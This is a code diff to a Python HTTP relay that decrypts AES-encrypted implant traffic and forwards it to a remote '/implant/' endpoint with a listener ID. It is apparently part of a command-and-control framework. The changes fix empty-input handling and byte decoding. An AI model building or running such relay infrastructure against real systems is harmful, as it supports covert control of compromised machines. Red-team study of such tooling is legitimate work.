@@ -53,6 +53,8 @@ class AESCipher(object):
         self.key = hashlib.sha256(key.encode()).digest()
 
     def encrypt(self, raw):
+        if (len(raw) == 0):
+            return raw
         raw = self._pad(raw)
         iv = Random.new().read(AES.block_size)
         cipher = AES.new(self.key, AES.MODE_CBC, iv)
@@ -61,9 +63,11 @@ class AESCipher(object):
 
     def decrypt(self, enc):
         #enc = base64.b64decode(enc)
+        if (len(enc) == 0):
+            return ""
         iv = enc[:AES.block_size]
         cipher = AES.new(self.key, AES.MODE_CBC, iv)
-        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
+        return self._unpad(cipher.decrypt(enc[AES.block_size:]))
 
     def _pad(self, s):
         return pkcs7.encode(s)
@@ -83,11 +87,13 @@ class S(SimpleHTTPRequestHandler):
         self.end_headers()
 
     def POST(self, url, body):
-        headers = {'Content-type': 'application/json; charset=utf-8'}
+        if(len(url) > 30):
+            headers = {'Content-type': 'application/octet-stream; charset=utf-8'}
+        else:
+            headers = {'Content-type': 'application/json; charset=utf-8'}
         if(args.id):
-            headers["listener"] = args.id
-        
-        response = requests.post(connectionString + url, data = body.encode('utf-8'), verify=True, headers=headers)
+            headers["listener"] = args.id    
+        response = requests.post(connectionString + url, data = body, verify=True, headers=headers)
         if(response.ok):
             return response.content
         else:
@@ -95,7 +101,7 @@ class S(SimpleHTTPRequestHandler):
 
     def do_POST(self):
         length = int(self.headers['content-length'])
-        url = "/implant/" + aes.decrypt(base64.b64decode(self.headers['Authorization']))
+        url = "/implant/" + aes.decrypt(base64.b64decode(self.headers['Authorization'])).decode('utf-8')
         try:
             response = (self.POST(url,aes.decrypt(self.rfile.read(length))))
             self._set_headers(200)
